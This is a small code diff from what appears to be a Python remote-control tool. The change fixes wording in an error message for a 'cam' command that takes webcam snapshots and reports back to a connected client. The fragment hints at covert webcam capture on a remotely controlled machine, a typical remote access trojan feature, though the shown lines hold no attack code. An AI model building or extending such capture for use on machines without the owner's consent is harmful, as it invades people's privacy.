@@ -174,7 +174,7 @@ while True:
                         activityOutput(client,'Camshot Executed Successfully')
                         break
             else:
-                activityOutput(client,'Camshot Not Executed , maybe not camera detected (!)<br><br>Example command : <br>cam camshot.jpg')
+                activityOutput(client,'Camshot Not Executed , maybe camera not detected (!)<br><br>Example command : <br>cam camshot.jpg')
         except:
             activityOutput(client,'Camshot Not Executed , maybe missed libraries<br>try this commands:<br><br>pip install opencv-python<br>pip install numpy<br><br>* use pip3 if you are in linux system')
             pass
